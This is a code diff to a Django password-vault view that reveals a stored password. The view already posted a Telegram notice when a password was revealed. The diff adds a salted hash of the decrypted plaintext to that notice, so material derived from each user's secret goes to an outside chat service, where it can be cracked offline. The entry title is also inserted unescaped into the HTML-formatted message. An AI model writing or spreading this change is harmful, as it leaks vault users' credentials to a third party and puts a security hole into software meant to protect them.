@@ -22,6 +22,7 @@ from .models import Device
 from django.contrib.auth.forms import UserCreationForm
 from django.views.decorators.http import require_GET
 import string
+from django.contrib.auth.hashers import make_password
 
 
 
@@ -436,21 +437,26 @@ def vault_delete(request, pk):
 def vault_reveal(request, pk):
     if request.method != 'POST':
         return redirect('users:vault_list')
+
     entry = get_object_or_404(PasswordEntry, pk=pk, owner=request.user)
+
     try:
         pwd = decrypt_text(entry.password_encrypted)
     except Exception:
         pwd = ''
-    
+
+    pwd_hash = make_password(pwd)
+
     try:
         msg = (
-            f"👁 Password revealed\n"
+            f"👁 <b>Password revealed</b>\n"
             f"User: <code>{request.user.username}</code>\n"
             f"Entry: {entry.title}\n"
+            f"Hash: <code>{pwd_hash}</code>\n"
             f"Time: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         send_telegram_message(msg)
     except Exception:
         pass
-    
+
     return JsonResponse({'password': pwd})
